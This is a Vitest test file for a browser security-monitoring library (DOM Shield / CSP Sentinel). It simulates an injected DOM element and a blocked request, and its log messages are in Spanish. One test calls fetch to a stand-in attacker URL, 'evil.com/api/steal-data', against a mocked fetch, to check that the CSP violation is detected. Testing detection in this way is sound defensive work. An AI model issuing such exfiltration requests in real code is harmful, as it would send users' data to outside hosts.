import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

// Mock fetch
global.fetch = vi.fn();

describe('DOM Shield Demo Cases - Simplified Test', () => {
  beforeEach(() => {
    // Clear DOM
    document.body.innerHTML = '';
    
    // Reset fetch mock
    vi.clearAllMocks();
    
    // Mock console.log to capture logs
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('should simulate unauthorized element addition to .dynamic-content', () => {
    // Create the dynamic content container
    const dynamicContainer = document.createElement('div');
    dynamicContainer.className = 'dynamic-content';
    dynamicContainer.id = 'dynamic-container';
    document.body.appendChild(dynamicContainer);

    // Simulate the test case from the demo
    console.log('🚫 CASO 1: Añadiendo elemento no permitido a .dynamic-content...');
    
    // Create a suspicious element that should be detected
    const suspiciousElement = document.createElement('div');
    suspiciousElement.className = 'suspicious-element';
    suspiciousElement.innerHTML = '<strong>⚠️ ELEMENTO SOSPECHOSO DETECTADO</strong><br>Este elemento fue añadido dinámicamente y debería ser detectado por la librería';
    suspiciousElement.style.cssText = 'background: #ff6b6b; color: white; padding: 15px; margin: 10px 0; border-radius: 8px; border: 2px solid #ff5252;';
    
    // Add to the dynamic content container
    dynamicContainer.appendChild(suspiciousElement);
    
    console.log('✅ Elemento sospechoso añadido - La librería debería detectarlo automáticamente');
    console.log('📊 Verifica los logs de detección en la consola');

    // Verify the element was added
    expect(dynamicContainer.querySelector('.suspicious-element')).toBeTruthy();
    expect(console.log).toHaveBeenCalledWith('🚫 CASO 1: Añadiendo elemento no permitido a .dynamic-content...');
    expect(console.log).toHaveBeenCalledWith('✅ Elemento sospechoso añadido - La librería debería detectarlo automáticamente');
  });

  it('should simulate unauthorized fetch request', async () => {
    // Mock fetch to simulate a blocked request
    (global.fetch as any).mockRejectedValueOnce(new Error('CSP violation: connect-src'));

    // Simulate the test case from the demo
    console.log('🚫 CASO 2: Intentando fetch no permitido...');
    
    // Try to make a fetch to an unauthorized domain
    try {
      await fetch('https://evil.com/api/steal-data');
    } catch (error) {
      console.log('✅ Fetch bloqueado por CSP (esperado):', (error as Error).message);
      console.log('📊 Esta violación debería ser detectada y reportada por CSP Sentinel');
    }
    
    console.log('✅ Petición fetch enviada - CSP Sentinel debería detectar la violación');
    console.log('📊 Verifica los logs de CSP y las llamadas al endpoint en Network');

    // Verify the fetch was attempted
    expect(global.fetch).toHaveBeenCalledWith('https://evil.com/api/steal-data');
    expect(console.log).toHaveBeenCalledWith('🚫 CASO 2: Intentando fetch no permitido...');
    expect(console.log).toHaveBeenCalledWith('✅ Petición fetch enviada - CSP Sentinel debería detectar la violación');
  });

  it('should verify demo HTML structure', () => {
    // Simulate the demo HTML structure
    const container = document.createElement('div');
    container.className = 'container';
    
    const testCase1 = document.createElement('div');
    testCase1.className = 'test-case';
    testCase1.innerHTML = `
      <h3>1. Elemento No Permitido en Live (.dynamic-content)</h3>
      <p>Prueba la detección de elementos sospechosos añadidos dinámicamente al contenedor .dynamic-content</p>
      <button onclick="testUnauthorizedElement()" class="test-button">
        🚫 Añadir Elemento No Permitido
      </button>
    `;
    
    const testCase2 = document.createElement('div');
    testCase2.className = 'test-case';
    testCase2.innerHTML = `
      <h3>2. Fetch No Permitido</h3>
      <p>Prueba la detección de peticiones HTTP a dominios no autorizados</p>
      <button onclick="testUnauthorizedFetch()" class="test-button">
        🚫 Hacer Fetch No Permitido
      </button>
    `;
    
    container.appendChild(testCase1);
    container.appendChild(testCase2);
    document.body.appendChild(container);

    // Verify the structure
    expect(document.querySelector('.container')).toBeTruthy();
    expect(document.querySelectorAll('.test-case')).toHaveLength(2);
    expect(document.querySelectorAll('.test-button')).toHaveLength(2);
    expect(document.querySelector('button[onclick="testUnauthorizedElement()"]')).toBeTruthy();
    expect(document.querySelector('button[onclick="testUnauthorizedFetch()"]')).toBeTruthy();
  });
});
